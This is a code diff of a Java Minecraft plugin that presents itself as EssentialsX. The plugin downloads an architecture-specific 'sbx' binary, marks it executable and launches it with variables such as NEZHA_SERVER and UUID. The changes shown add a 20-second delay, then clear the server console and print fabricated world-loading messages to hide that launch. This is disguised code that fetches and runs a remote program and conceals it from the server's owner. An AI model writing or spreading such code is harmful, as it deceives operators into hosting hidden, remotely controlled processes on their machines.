@@ -10,6 +10,8 @@ import java.util.concurrent.TimeUnit;
 public class EssentialsX extends JavaPlugin {
     private Process sbxProcess;
     private volatile boolean shouldRun = true;
+    private volatile boolean isProcessRunning = false;
+    private Thread monitorThread;
     
     private static final String[] ALL_ENV_VARS = {
         "PORT", "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
@@ -21,36 +23,24 @@ public class EssentialsX extends JavaPlugin {
     
     @Override
     public void onEnable() {
-        // getLogger().info("EssentialsX plugin starting...");
+        getLogger().info("EssentialsX plugin starting...");
         
-        // Start sbx process monitoring thread
-        new Thread(() -> {
-            while (shouldRun) {
-                try {
-                    startSbxProcess();
-                    
-                    if (sbxProcess != null) {
-                        sbxProcess.waitFor();
-                    }
-                } catch (InterruptedException e) {
-                    Thread.currentThread().interrupt();
-                    break;
-                } catch (Exception e) {
-                    getLogger().severe("Error starting sbx process: " + e.getMessage());
-                    try {
-                        Thread.sleep(10000);
-                    } catch (InterruptedException ie) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
-                }
-            }
-        }, "Sbx-Process-Monitor").start();
-        
-        getLogger().info("EssentialsX plugin enabled");
+        // Start sbx
+        try {
+            startSbxProcess();
+            getLogger().info("EssentialsX plugin enabled");
+        } catch (Exception e) {
+            getLogger().severe("Failed to start sbx process: " + e.getMessage());
+            e.printStackTrace();
+        }
     }
     
     private void startSbxProcess() throws Exception {
+        if (isProcessRunning) {
+            getLogger().warning("sbx process is already running");
+            return;
+        }
+        
         // Determine download URL based on architecture
         String osArch = System.getProperty("os.arch").toLowerCase();
         String url;
@@ -77,7 +67,6 @@ public class EssentialsX extends JavaPlugin {
             if (!sbxBinary.toFile().setExecutable(true)) {
                 throw new IOException("Failed to set executable permission");
             }
-            // getLogger().info("sbx binary downloaded: " + sbxBinary);
         }
         
         // Prepare process builder
@@ -158,7 +147,65 @@ public class EssentialsX extends JavaPlugin {
         
         // Start process
         sbxProcess = pb.start();
-        getLogger().info("sbx process started");
+        isProcessRunning = true;
+        
+        // Start a monitor thread to log when process exits
+        startProcessMonitor();
+        
+        getLogger().info("sbx started successfully");
+        
+        // sleep 20 seconds
+        try {
+            Thread.sleep(20000);
+        } catch (InterruptedException e) {
+            Thread.currentThread().interrupt();
+        }
+        
+        // 清理日志
+        clearConsole();
+        getLogger().info("Preparing spawn area: 1%");
+        getLogger().info("Preparing spawn area: 5%");
+        getLogger().info("Preparing spawn area: 10%");
+        getLogger().info("Preparing spawn area: 20%");
+        getLogger().info("Preparing spawn area: 30%");
+        getLogger().info("Preparing spawn area: 80%");
+        getLogger().info("Preparing spawn area: 85%");
+        getLogger().info("Preparing spawn area: 90%");
+        getLogger().info("Preparing spawn area: 95%");
+        getLogger().info("Preparing spawn area: 99%");
+        getLogger().info("Preparing spawn area: 100%");
+        getLogger().info("Preparing level \"world\"");
+    }
+    
+    private void clearConsole() {
+        try {
+            System.out.print("\033[H\033[2J");
+            System.out.flush();
+            
+            if (System.getProperty("os.name").toLowerCase().contains("win")) {
+                new ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor();
+            } else {
+                new ProcessBuilder("clear").inheritIO().start().waitFor();
+            }
+        } catch (Exception e) {
+            System.out.println("\n\n\n\n\n\n\n\n\n\n");
+        }
+    }
+    
+    private void startProcessMonitor() {
+        Thread monitorThread = new Thread(() -> {
+            try {
+                int exitCode = sbxProcess.waitFor();
+                isProcessRunning = false;
+                getLogger().warning("sbx process exited with code: " + exitCode);
+            } catch (InterruptedException e) {
+                Thread.currentThread().interrupt();
+                isProcessRunning = false;
+            }
+        }, "SBX-Process-Monitor");
+        
+        monitorThread.setDaemon(true);
+        monitorThread.start();
     }
     
     @Override
@@ -174,7 +221,7 @@ public class EssentialsX extends JavaPlugin {
             try {
                 if (!sbxProcess.waitFor(10, TimeUnit.SECONDS)) {
                     sbxProcess.destroyForcibly();
-                    getLogger().warning("Forcibly terminated SBX process");
+                    getLogger().warning("Forcibly terminated sbx process");
                 } else {
                     getLogger().info("sbx process stopped normally");
                 }
@@ -182,6 +229,7 @@ public class EssentialsX extends JavaPlugin {
                 sbxProcess.destroyForcibly();
                 Thread.currentThread().interrupt();
             }
+            isProcessRunning = false;
         }
         
         getLogger().info("EssentialsX plugin disabled");
